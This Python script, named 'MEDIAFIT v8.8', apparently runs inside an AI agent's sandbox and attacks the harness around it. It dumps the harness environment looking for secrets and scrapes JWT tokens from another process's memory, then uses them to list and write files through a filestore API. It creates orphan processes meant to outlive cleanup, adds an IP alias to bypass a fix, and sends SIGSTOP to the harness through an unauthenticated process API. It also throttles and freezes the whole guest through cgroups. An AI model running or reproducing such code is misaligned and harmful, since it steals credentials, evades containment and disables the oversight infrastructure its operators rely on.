#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v8.8
#  fix: unpack_from (alias) | NEW: cgroup write surface, freezer+watchdog, /proc read surface,
#  full process tree, boot_id | A: orphan in /dev/shm | B: harness SIGSTOP + T-scan | C: variants | D: C2PA
import os, re, json, time, base64, struct, socket, fcntl, hashlib
import random, string, subprocess, traceback, urllib.request, urllib.error

VER   = "8.8"
NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT   = "/mnt/user-data/outputs/mediafit-report.txt"
STATEF = "/dev/shm/mfstate.json"
ALIAS = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG    = "/sys/fs/cgroup"
BASE  = "https://api.anthropic.com/v1/filestore/fs/"

L = []
def W(s=""):
    L.append(str(s))
    try:
        with open(OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass

def sec(t):
    W(""); W("=" * 70); W("### " + t); W("=" * 70)

def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

def wr(p, v):
    with open(p, "w") as f: f.write(str(v))

def sh(c, t=8):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

# ---------------- proc ----------------
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"

def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1

def poll_state(pid, want, secs=2.5):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last

def t_scan():
    return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def t_detail(pids):
    for p in pids:
        W("      T-pid %d ppid=%d cmd=%s" % (p, ppid_of(p),
          rd("/proc/%d/cmdline" % p).replace("\x00", " ").strip()[:70]))

# ---------------- cgroup ----------------
def cg_procs(hid):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
    except Exception: return []

def cg_list(hid):
    out = []
    try:
        for c in sorted(os.listdir(CG)):
            d = os.path.join(CG, c, "process_api", hid)
            if os.path.isdir(d): out.append(c)
    except Exception: pass
    return out

# ---------------- net ----------------
def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 12)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()

def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + socket.inet_aton(AIP) + b"\x00" * 10
        fcntl.ioctl(s, 0x8916, ifr)                                     # SIOCSIFADDR
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]  # SIOCGIFFLAGS  <-- FIX
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok"
        e1 = "ioctl ran, addr=%s" % if_addr(ALIAS)
    except Exception as e:
        e1 = repr(e)
    finally:
        s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS),
              "ip addr add %s/32 dev eth0" % AIP,
              "ifconfig %s %s netmask 255.255.255.255 up" % (ALIAS, AIP)]:
        sh(c)
        if if_addr(ALIAS) == AIP: return "fallback ok: " + c
    return "FAIL (%s)" % e1

def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
               "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake: " + buf[:120].decode("utf-8", "replace"))
        buf += d
    head = buf.split(b"\r\n", 1)[0].decode("utf-8", "replace")
    if "101" not in head: raise IOError("handshake: " + head)
    return s

def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")

def ws_drain(s, timeout=0.7):
    out = []
    while True:
        r = ws_recv(s, timeout)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
    return out

# ---------------- api ----------------
def spec(prog, args, reattach=True, mem=268435456, uid=0, gid=0, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": uid, "gid": gid, "memory_limit_bytes": mem}

def pconn(pid, cr):
    return {"process_id": pid, "allow_process_id_reuse": True, "create_req": cr}

def nid(): return os.urandom(16).hex()
TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=12):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout); return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return -1, repr(e).encode()

def find_tokens(budget=25.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks

def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}

# ======================================================================
def main():
    sec("RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))

    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    W("  boot_id=%s uptime=%s" % (boot, rd("/proc/uptime").strip()))
    W("  /proc/1/cmdline = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
    W("  /proc/1/status caps: %s" % [x for x in rd("/proc/1/status").splitlines() if "Cap" in x or x.startswith("Name")])
    W("  self caps: %s" % [x for x in rd("/proc/self/status").splitlines() if "CapEff" in x])
    W("  /etc/hosts:\n    " + rd("/etc/hosts").strip().replace("\n", "\n    "))

    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    W("  our pid=%d chain=%s harness_pid=%d (ppid=%d) harness_process_id=%s" % (mypid, chain, H, ppid_of(H), HID))

    sec("0b. FULL PROCESS TREE")
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("  pid %-6s ppid=%-6s st=%s cg=%-44s %s" % (q, ppid_of(int(q)), pstat(int(q)),
          (m.group(1) if m else "?"), rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()[:80]))

    sec("1. /proc READ SURFACE (PID 1 vs harness) + net tables")
    for pid, tag in [(1, "PID1"), (H, "HARNESS")]:
        for f in ["cmdline", "environ", "maps", "status", "mountinfo", "io", "limits", "cwd", "root", "exe"]:
            d = rd("/proc/%d/%s" % (pid, f))
            W("  %s /proc/%d/%-9s -> %s" % (tag, pid, f, d[:90].strip().replace("\n", " ") if not d.startswith("ERR:") else d[:60]))
        try: W("  %s /proc/%d/fd -> %d entries" % (tag, pid, len(os.listdir("/proc/%d/fd" % pid))))
        except Exception as e: W("  %s /proc/%d/fd -> ERR %r" % (tag, pid, e))
    env = rd("/proc/%d/environ" % H)
    if not env.startswith("ERR:"):
        vs = [v for v in env.split("\x00") if v]
        W("  HARNESS environ (%d vars):" % len(vs))
        for v in vs[:60]: W("      %s" % v[:150])
        for v in vs:
            if re.search(r"eyJ|sk-ant|TOKEN|SECRET|KEY|oauth|OAUTH", v): W("      [SECRET?] %s" % v[:160])
    for f in ["tcp", "tcp6", "vsock", "unix"]:
        d = rd("/proc/net/" + f)
        W("  /proc/net/%s -> %s" % (f, d[:100].replace("\n", " ") if d.startswith("ERR:") else "%d lines" % len(d.splitlines())))
    W("  /proc/net/tcp:\n    " + "\n    ".join(rd("/proc/net/tcp").splitlines()[:20]))

    sec("2. CGROUP SURFACE (controllers + values + write-back)")
    W("  controllers holding process_api/<id>: %s" % cg_list(HID))
    W("  /proc/self/cgroup:\n    " + rd("/proc/self/cgroup").strip().replace("\n", "\n    "))
    for c in cg_list(HID):
        d = os.path.join(CG, c, "process_api", HID)
        W("  [%s] %s" % (c, d))
        for n in sorted(os.listdir(d)):
            pp = os.path.join(d, n)
            if os.path.isdir(pp): continue
            v = rd(pp).strip().replace("\n", " | ")
            W("      %-34s = %s" % (n, v[:200]))
    for c in ["pids", "freezer", "cpu", "cpuset", "blkio"]:
        r = os.path.join(CG, c)
        if not os.path.isdir(r): continue
        W("  [root %s]" % c)
        for n in sorted(os.listdir(r)):
            pp = os.path.join(r, n)
            if os.path.isdir(pp): continue
            if not re.search(r"current|max|events|state|shares|quota|period|weight|cpus|mems", n): continue
            W("      %-30s = %s" % (n, rd(pp).strip().replace("\n", " | ")[:90]))

    # write-back tests
    for path in ["%s/memory/process_api/%s/memory.limit_in_bytes" % (CG, HID),
                 "%s/memory/process_api/%s/memory.soft_limit_in_bytes" % (CG, HID),
                 "%s/pids/pids.max" % CG]:
        if not os.path.exists(path): W("  MISSING %s" % path); continue
        old = rd(path).strip()
        try:
            wr(path, old); W("  WRITE-BACK OK  %s = %s" % (path.split("/sys/fs/cgroup/")[-1], old))
        except Exception as e:
            W("  WRITE-BACK FAIL %s -> %r" % (path, e))

    sec("2b. *** pids.max LIVE PROOF (throttle the whole guest) ***")
    d = CG + "/pids"
    try:
        cur = int(rd(d + "/pids.current").strip()); mx = rd(d + "/pids.max").strip()
        W("  BEFORE current=%d max=%s events=[%s]" % (cur, mx, rd(d + "/pids.events").strip().replace("\n", " ")))
        kids = []; fails = 0
        try:
            wr(d + "/pids.max", str(cur + 2)); W("  wrote pids.max=%d" % (cur + 2))
            for _ in range(8):
                try:
                    pid = os.fork()
                    if pid == 0:
                        time.sleep(0.9); os._exit(0)
                    kids.append(pid)
                except OSError:
                    fails += 1
            W("  fork x8 -> ok=%d EAGAIN=%d" % (len(kids), fails))
            W("  DURING current=%s events=[%s]" % (rd(d + "/pids.current").strip(),
              rd(d + "/pids.events").strip().replace("\n", " ")))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(d + "/pids.max", mx)
            W("  RESTORED pids.max=%s -> now %s" % (mx, rd(d + "/pids.max").strip()))
    except Exception as e:
        W("  pids proof err %r" % e)

    sec("3. BYPASS FIX CHECK (secondary source IP)")
    W("  add_alias -> %s  (if_addr=%s)" % (add_alias(), if_addr(ALIAS)))
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e:
            W("  src %-11s -> %r" % (src[0], e))

    sec("4. ORPHAN PERSISTENCE (state in /dev/shm, survives rm -rf /tmp/mediafit)")
    saved = {}
    if os.path.exists(STATEF):
        try: saved = json.load(open(STATEF))
        except Exception: saved = {}
    oid = saved.get("process_id", "")
    W("  saved orphan=%s boot_then=%s boot_now=%s same_vm=%s" % (oid, saved.get("boot"), boot, saved.get("boot") == boot))
    live = cg_procs(HID)
    W("  pids in our cgroup: %s" % live)
    other = [int(q) for q in os.listdir("/proc") if q.isdigit() and "process_api/" + HID not in rd("/proc/%s/cgroup" % q)]
    W("  pids OUTSIDE our cgroup: %s" % other[:20])
    if oid and oid != HID:
        W("  --> REATTACH %s" % oid)
        try:
            s = ws_connect()
            ws_send(s, pconn(oid, TRUE)); W("  attach r1 = %s" % ws_recv(s, 2.0))
            ws_send(s, {"ExpectStdOut": None}); W("  live stdout = %s" % ws_drain(s, 0.9)[:5])
            s.close()
        except Exception as e: W("  reattach err %r" % e)
    else:
        W("  --> CREATE orphan")
        o = nid()
        cr = spec("/bin/sh", ["-c", "i=0; while true; do echo ORPHAN_LINE_$i; i=$((i+1)); sleep 1; done"], True)
        try:
            s = ws_connect(); ws_send(s, pconn(o, cr)); W("  create r1 = %s" % ws_recv(s, 3.0))
            ws_send(s, {"ExpectStdOut": None}); time.sleep(1.3)
            W("  stdout = %s" % ws_drain(s, 0.9)[:4]); s.close()
            json.dump({"process_id": o, "boot": boot}, open(STATEF, "w"))
            W("  saved %s" % o)
        except Exception as e: W("  create err %r" % e)

    sec("5. *** SIGSTOP THE HARNESS VIA UNAUTHENTICATED WS API (T-scan) ***")
    W("  harness pid=%d state=%s T-scan_before=%s" % (H, pstat(H), t_scan()))
    try:
        s = ws_connect(); ws_send(s, pconn(HID, TRUE)); W("  attach r1 = %s" % ws_recv(s, 2.5))
        ws_send(s, {"SendSignal": {"signal": 19}}); W("  STOP resp = %s" % ws_recv(s, 1.5))
        W("  harness state AFTER STOP = %s" % poll_state(H, "T", 3.0))
        ts = t_scan(); W("  T-scan AFTER STOP = %s" % ts); t_detail(ts)
        try:
            ws_send(s, {"SendSignal": {"signal": 18}}); W("  CONT resp = %s" % ws_recv(s, 1.5))
        except Exception as e: W("  cont send err %r" % e)
        st = poll_state(H, "S", 2.5)
        if pstat(H) != "S":
            try: os.kill(H, 18)
            except Exception: pass
            st = poll_state(H, "S", 2.5)
        W("  harness state AFTER CONT = %s  T-scan=%s" % (st, t_scan()))
        s.close()
    except Exception as e:
        W("  ERR %r" % e)
        try: os.kill(H, 18)
        except Exception: pass

    sec("6. VARIANT LIST (full) + ENUMERATION on clean process")
    o = nid(); cr = spec("/bin/sh", ["-c", "sleep 40"], True, 67108864)
    try:
        s = ws_connect(); ws_send(s, pconn(o, cr)); W("  create r1 = %s" % ws_recv(s, 3.0))
        ws_send(s, {"__BOGUS__": None})
        for f in ws_drain(s, 1.2): W("  FULL-LIST >> %s" % f)
        s.close()
    except Exception as e: W("  ERR %r" % e)
    for c in ["Attach", "Detach", "KeepAlive", "Closed", "Resize", "PtyResize", "Stdin",
              "StdIn", "StdinEOF", "StdInEOF", "Eof", "ExpectStdIn", "ExpectStdErr",
              "Signal", "Terminate", "Shutdown", "Close", "Ping", "Pong", "StdInClose",
              "SetTty", "ResizeTty", "Heartbeat"]:
        try:
            s = ws_connect(); ws_send(s, pconn(o, cr)); r1 = ws_recv(s, 2.0)
            ws_send(s, {c: None}); r2 = ws_drain(s, 0.7)
            bad = any("unknown variant" in x for x in r2)
            W("  %-12s r1=%-26s -> %-12s %s" % (c, str(r1)[:26], "INVALID" if bad else ("valid/silent" if not r2 else "VALID/reply"), str(r2)[:140]))
            s.close()
        except Exception as e: W("  %-12s ERR %r" % (c, e))
    try:
        s = ws_connect(); ws_send(s, pconn(o, cr)); ws_recv(s, 2.0)
        ws_send(s, {"Kill": None}); W("  Kill -> %s" % ws_drain(s, 1.0)); s.close()
    except Exception as e: W("  Kill ERR %r" % e)

    sec("7. C2PA / md5 INTEGRITY (matching token)")
    toks = find_tokens(); W("  tokens=%d" % len(toks))
    pick = None
    for t in toks[:12]:
        c = claims_of(t); W("  claims fsid=%s roots=%s" % (c.get("filesystem_id"), c.get("allowed_roots")))
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if not pick:
        W("  no /outputs token")
    else:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        st, bd = http(BASE + "listDirectory", "POST", json.dumps({"filesystem_id": fsid, "path": "/outputs"}).encode(), hdr)
        W("  listDirectory -> %s %s" % (st, bd[:160]))
        if st == 200:
            svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
            path = "/outputs/__mf_c2pa_%s.svg" % NONCE
            for fn in ["file", "content", "data", "files", "upload"]:
                bnd = "----mf" + NONCE + fn
                body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                        + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                        + ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % (bnd, fn)).encode()
                        + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
                st2, b2 = http(BASE + "createFile", "POST", body,
                               {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd})
                W("  createFile field=%-8s -> %s %s" % (fn, st2, b2[:150]))
                if st2 == 200:
                    st3, b3 = http(BASE + "readFile", "POST", json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
                    W("  readFile -> %s len=%d" % (st3, len(b3)))
                    if st3 == 200:
                        W("  md5 SENT=%s len=%d | md5 STORED=%s len=%d | IDENTICAL=%s" % (
                            hashlib.md5(svg).hexdigest(), len(svg), hashlib.md5(b3).hexdigest(), len(b3),
                            hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
                        W("  stored head: %s" % b3[:160])
                    break

    sec("8. *** FREEZER: freeze the WHOLE guest (incl. PID 1) + self-made watchdog ***")
    fz = CG + "/freezer"
    W("  root freezer.state = %s" % rd(fz + "/freezer.state").strip())
    wd = fz + "/mf_watchdog"
    try: os.mkdir(wd); W("  mkdir %s ok" % wd)
    except FileExistsError: W("  %s exists" % wd)
    except Exception as e: W("  mkdir -> %r" % e)
    helper = None
    try:
        wr("/dev/shm/mf_wd.log", "")
        pr = subprocess.Popen(["/bin/sh", "-c",
              "sleep 6; echo THAWED > %s/freezer.state; echo WD_DONE >> /dev/shm/mf_wd.log" % fz],
              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        helper = pr.pid
        wr(wd + "/cgroup.procs", helper)
        W("  watchdog pid=%d in %s -> %s" % (helper, wd, rd(wd + "/cgroup.procs").strip()))
    except Exception as e:
        W("  watchdog err %r" % e)
    t0 = time.time()
    try:
        wr(fz + "/freezer.state", "FROZEN")
        W("  FROZEN(root) -> state=%s elapsed=%.2fs" % (rd(fz + "/freezer.state").strip(), time.time() - t0))
        W("  harness state while frozen = %s   self state=%s" % (pstat(H), pstat(mypid)))
    except Exception as e:
        W("  FROZEN err %r" % e)
    try:
        wr(fz + "/freezer.state", "THAWED")
        W("  THAWED -> state=%s total=%.2fs  harness=%s  wd_log=%s" % (
            rd(fz + "/freezer.state").strip(), time.time() - t0, pstat(H), rd("/dev/shm/mf_wd.log").strip()))
    except Exception as e:
        W("  THAW err %r" % e)
    if helper:
        try: os.kill(helper, 9)
        except Exception: pass
    try: os.rmdir(wd)
    except Exception: pass

    sec("END t=%s" % time.strftime("%H:%M:%S"))

if __name__ == "__main__":
    try: main()
    except Exception:
        W("FATAL\n" + traceback.format_exc())